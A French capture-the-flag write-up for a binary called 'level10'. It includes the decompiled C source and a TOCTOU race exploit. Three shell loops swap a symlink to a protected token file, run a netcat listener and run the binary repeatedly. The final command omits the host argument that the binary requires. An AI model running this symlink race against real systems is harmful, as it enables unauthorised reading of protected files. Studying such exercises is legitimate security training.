On voit un binaire level10 qui semble envoyer le contenu d' un fichier a un addresse

en desassemblant le binaire on voit que access est utiliser pour ouvrir le fichier:

    int main(int argc,char **argv)
    {
      char *__cp;
      uint16_t uVar1;
      int iVar2;
      int iVar3;
      ssize_t sVar4;
      size_t __n;
      int *piVar5;
      char *pcVar6;
      int in_GS_OFFSET;
      undefined4 *in_stack_00000008;
      char *file;
      char *host;
      int fd;
      int ffd;
      int rc;
      char buffer [4096];
      sockaddr_in sin;
      undefined1 local_1024 [4096];
      sockaddr local_24;
      int local_14;
    
      local_14 = *(int *)(in_GS_OFFSET + 0x14);
      if (argc < 3) {
        printf("%s file host\n\tsends file to host if you have access to it\n",*in_stack_00000008);
                        // WARNING: Subroutine does not return
        exit(1);
      }
      pcVar6 = (char *)in_stack_00000008[1];
      __cp = (char *)in_stack_00000008[2];
      iVar2 = access((char *)in_stack_00000008[1],4); //on voit dans le man de access qu' un fail existe
      if (iVar2 == 0) {
        printf("Connecting to %s:6969 .. ",__cp);
        fflush(stdout);
        iVar2 = socket(2,1,0);
        local_24.sa_data[2] = '\0';
        local_24.sa_data[3] = '\0';
        local_24.sa_data[4] = '\0';
        local_24.sa_data[5] = '\0';
        local_24.sa_data[6] = '\0';
        local_24.sa_data[7] = '\0';
        local_24.sa_data[8] = '\0';
        local_24.sa_data[9] = '\0';
        local_24.sa_data[10] = '\0';
        local_24.sa_data[0xb] = '\0';
        local_24.sa_data[0xc] = '\0';
        local_24.sa_data[0xd] = '\0';
        local_24.sa_family = 2;
        local_24.sa_data[0] = '\0';
        local_24.sa_data[1] = '\0';
        local_24.sa_data._2_4_ = inet_addr(__cp);
        uVar1 = htons(0x1b39);
        local_24.sa_data._0_2_ = uVar1;
        iVar3 = connect(iVar2,&local_24,0x10);
        if (iVar3 == -1) {
          printf("Unable to connect to host %s\n",__cp);
                        // WARNING: Subroutine does not return
          exit(1);
        }
        sVar4 = write(iVar2,".*( )*.\n",8);
        if (sVar4 == -1) {
          printf("Unable to write banner to host %s\n",__cp);
                        // WARNING: Subroutine does not return
          exit(1);
        }
        printf("Connected!\nSending file .. ");
        fflush(stdout);
        iVar3 = open(pcVar6,0);
        if (iVar3 == -1) {
          puts("Damn. Unable to open file");
                        // WARNING: Subroutine does not return
          exit(1);
        }
        __n = read(iVar3,local_1024,0x1000);
        if (__n == 0xffffffff) {
          piVar5 = __errno_location();
          pcVar6 = strerror(*piVar5);
          printf("Unable to read from file: %s\n",pcVar6);
                        // WARNING: Subroutine does not return
          exit(1);
        }
        write(iVar2,local_1024,__n);
        iVar2 = puts("wrote file!");
      }
      else {
        iVar2 = printf("You don\'t have access to %s\n",pcVar6);
      }
      if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                        // WARNING: Subroutine does not return
        __stack_chk_fail();
      }
      return iVar2;
    }

Dans le man de access on apprend que une faille exite (TOCTOU) qui consiste a exploiter le temps entre la verification des droit et l' ouverture du fichier:
Le but est d'echanger le fichier entre les 2 operation Pour se faire on echange la target d'un liens symbolique en boucle pendant que on tente de lire le fichier.
    sur un terminal on fait l' echange en boucle:
        touch /tmp/fichier
        while true; do ln -fs /tmp/fichier /tmp/Toctou; ln -fs /home/user/level/token /tmp/Toctou; done;
    terminal 2 on creer un serveur pour recevoir le message:
        while true;  do nc.traditional -l -p 6969 | grep -v '.*( )*.' ; done;
    terminal 3 on spam les envoie:
        while true; do ./level10 /tmp/Toctou; done;